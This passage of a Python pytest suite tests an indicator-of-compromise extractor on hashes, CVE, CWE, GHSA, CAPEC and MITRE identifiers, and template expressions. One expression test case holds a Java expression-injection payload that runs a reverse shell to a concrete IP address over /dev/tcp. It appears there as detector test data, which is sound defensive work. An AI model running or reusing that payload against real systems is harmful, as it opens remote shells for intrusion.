        not in matches
    )


@pytest.mark.parametrize(
    "text, expected",
    [
        ("44d88612fea8a8f36de82e1278abb02f", {"44d88612fea8a8f36de82e1278abb02f"}),
        ("d41d8cd98f00b204e9800998ecf8427e", {"d41d8cd98f00b204e9800998ecf8427e"}),
        ("A" * 32, {"A" * 32}),
    ],
)
def test_extract_md5_valid(text, expected):
    matches = get_iocs(text, "md5")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "d41d8cd98f00b204e9800998ecf8427",
        "d41d8cd98f00b204e9800998ecf8427ee",
        "g41d8cd98f00b204e9800998ecf8427e",
        "d41d8cd98f00b204e9800998ecf8427e ",
    ],
)
def test_extract_md5_invalid(text):
    matches = get_iocs(text, "md5")
    assert text not in matches


@pytest.mark.parametrize(
    "text, expected",
    [
        (
            "da39a3ee5e6b4b0d3255bfef95601890afd80709",
            {"da39a3ee5e6b4b0d3255bfef95601890afd80709"},
        ),
        (
            "a9993e364706816aba3e25717850c26c9cd0d89d",
            {"a9993e364706816aba3e25717850c26c9cd0d89d"},
        ),
        ("F" * 40, {"F" * 40}),
    ],
)
def test_extract_sha1_valid(text, expected):
    matches = get_iocs(text, "sha1")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "da39a3ee5e6b4b0d3255bfef95601890afd8070",
        "da39a3ee5e6b4b0d3255bfef95601890afd807090",
        "z239a3ee5e6b4b0d3255bfef95601890afd80709",
    ],
)
def test_extract_sha1_invalid(text):
    matches = get_iocs(text, "sha1")
    assert text not in matches


@pytest.mark.parametrize(
    "text, expected",
    [
        (
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            {"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
        ),
        (
            "cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce",
            {"cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce"},
        ),
        ("A" * 64, {"A" * 64}),
    ],
)
def test_extract_sha256_valid(text, expected):
    matches = get_iocs(text, "sha256")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b85",
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b8550",
        "g3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    ],
)
def test_extract_sha256_invalid(text):
    matches = get_iocs(text, "sha256")
    assert not matches


@pytest.mark.parametrize(
    "text, expected",
    [
        ("CVE-2021-34527", {"CVE-2021-34527"}),
        ("CVE-2019-0708 CVE-2020-1472", {"CVE-2019-0708", "CVE-2020-1472"}),
    ],
)
def test_extract_cve_valid(text, expected):
    matches = get_iocs(text, "cve")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "CVE2021-34527",
        "CVE-21-34527",
        "CVE-202134527",
        "CVE-2021-12345678",
    ],
)
def test_extract_cve_invalid(text):
    matches = get_iocs(text, "cve")
    assert not matches


@pytest.mark.parametrize(
    "text, expected",
    [
        ("CWE-295", {"CWE-295"}),
        ("CWE-290 CWE-532", {"CWE-290", "CWE-532"}),
    ],
)
def test_extract_cwe_valid(text, expected):
    matches = get_iocs(text, "cwe")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "CWE295",
        "CWE-",
        "CWE-999999",
    ],
)
def test_extract_cwe_invalid(text):
    matches = get_iocs(text, "cwe")
    assert not matches


@pytest.mark.parametrize(
    "text, expected",
    [
        ("GHSA-v63m-x9r9-8gqp", {"GHSA-v63m-x9r9-8gqp"}),
        ("ghsa-6h2x-4gjf-jc5w", {"ghsa-6h2x-4gjf-jc5w"}),
    ],
)
def test_extract_ghsa_valid(text, expected):
    matches = get_iocs(text, "ghsa")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "GHSA-v63m-x9r9",
        "GHSA-v63m-x9r9-8gq",
    ],
)
def test_extract_ghsa_invalid(text):
    matches = get_iocs(text, "ghsa")
    assert not matches


@pytest.mark.parametrize(
    "text, expected",
    [
        ("CAPEC-233", {"CAPEC-233"}),
        ("CAPEC-115 and CAPEC-165", {"CAPEC-115", "CAPEC-165"}),
    ],
)
def test_extract_capec_valid(text, expected):
    matches = get_iocs(text, "capec")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "CAPEC233",
        "CAPEC-",
        "CAPEC-ABC",
    ],
)
def test_extract_capec_invalid(text):
    matches = get_iocs(text, "capec")
    assert not matches


def test_extract_reference_iocs_survive_url_deduplication():
    text = (
        "Advisory link: https://github.com/advisories/GHSA-v63m-x9r9-8gqp "
        "and weakness link: https://cwe.mitre.org/data/definitions/295.html with CWE-295."
    )
    iocs = extract_iocs(text)
    assert "https://github.com/advisories/GHSA-v63m-x9r9-8gqp" in iocs["url"]
    assert "GHSA-v63m-x9r9-8gqp" in iocs["ghsa"]
    assert "CWE-295" in iocs["cwe"]


def test_extract_mitre_attack_t_does_not_synthesize_from_url_paths():
    text = "Technique link: https://attack.mitre.org/techniques/T1059/001/."
    iocs = extract_iocs(text)
    assert "https://attack.mitre.org/techniques/T1059/001/" in iocs["url"]
    assert "T1059.001" not in iocs["mitre_attack_t"]


def test_extract_mitre_tactic_survives_url_deduplication():
    text = "Tactic link: https://attack.mitre.org/tactics/TA0001/."
    iocs = extract_iocs(text)
    assert "https://attack.mitre.org/tactics/TA0001/" in iocs["url"]
    assert "TA0001" in iocs["mitre_tactic"]


@pytest.mark.parametrize(
    "text, expected",
    [
        ("The configuration is set to ${CONFIG_PATH}", {"${CONFIG_PATH}"}),
        ("Multiple vars: ${VAR1} and ${VAR2}", {"${VAR1}", "${VAR2}"}),
        ("Edge case: ${a}", {"${a}"}),
        ("Numbers: ${12345}", {"${12345}"}),
        ("Mixed chars: ${env.PATH}", {"${env.PATH}"}),
        (
            "${ \"\" .getClass().forName( 'java.lang.Runtime' ).getMethod( 'getRuntime' ).invoke( null )."
            "exec( 'sh -i >& /dev/tcp/47.120.74.19/8080 0>&1' )}",
            {
                "${ \"\" .getClass().forName( 'java.lang.Runtime' ).getMethod( 'getRuntime' ).invoke( null )."
                "exec( 'sh -i >& /dev/tcp/47.120.74.19/8080 0>&1' )}"
            },
        ),
    ],
)
def test_extract_expressions_valid(text, expected):
    matches = get_iocs(text, "expressions")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "${}",
        "${UNFINISHED",
        "UNFINISHED}",
        "{VAR}",
        "VAR",
    ],
)
def test_extract_expressions_invalid(text):
    matches = get_iocs(text, "expressions")
    assert not matches
